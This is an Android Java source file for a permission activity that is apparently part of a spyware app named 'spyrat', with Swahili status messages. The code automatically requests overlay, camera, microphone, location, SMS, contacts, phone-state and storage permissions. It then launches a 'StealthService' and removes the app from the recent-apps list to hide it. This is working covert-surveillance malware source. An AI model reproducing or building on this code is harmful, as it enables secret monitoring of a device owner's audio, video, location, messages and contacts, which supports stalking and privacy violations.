package com.spyrat.investigation;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;

public class PermissionActivity extends Activity {
    private static final int OVERLAY_PERMISSION_REQUEST = 1001;
    private SharedPreferences prefs;
    private String investigatorCode;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission);
        
        prefs = getSharedPreferences("InvestigationPrefs", MODE_PRIVATE);
        investigatorCode = getIntent().getStringExtra("investigator_code");
        
        if (investigatorCode == null) {
            investigatorCode = prefs.getString("investigator_code", "");
        }
        
        TextView statusText = findViewById(R.id.statusText);
        Button grantButton = findViewById(R.id.grantButton);
        
        statusText.setText("Tayari code: " + investigatorCode + "\\nSasa tunahitaji ruhusa");
        
        grantButton.setOnClickListener(v -> requestAllPermissions());
        
        // Auto-start permission request after 2 seconds
        new Handler().postDelayed(this::requestAllPermissions, 2000);
    }
    
    private void requestAllPermissions() {
        // 1. Request Overlay Permission first (most important)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                return;
            }
        }
        
        // 2. Request other dangerous permissions
        String[] permissions = {
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO", 
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE"
        };
        
        ActivityCompat.requestPermissions(this, permissions, 101);
        
        // 3. Start service and finish
        startStealthService();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Overlay permission imepatikana!", Toast.LENGTH_SHORT).show();
                }
            }
            
            // Continue with other permissions
            requestAllPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == 101) {
            // Permissions granted, start service
            startStealthService();
        }
    }
    
    private void startStealthService() {
        try {
            // Save that permissions were requested
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("permissions_granted", true);
            editor.apply();
            
            // Start the stealth service
            Intent serviceIntent = new Intent(this, StealthService.class);
            startService(serviceIntent);
            
            // Hide the app from recent apps
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask();
            } else {
                finish();
            }
            
            Toast.makeText(this, "Service imeanzishwa kikamilifu!", Toast.LENGTH_LONG).show();
            
        } catch (Exception e) {
            Toast.makeText(this, "Hitilafu: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
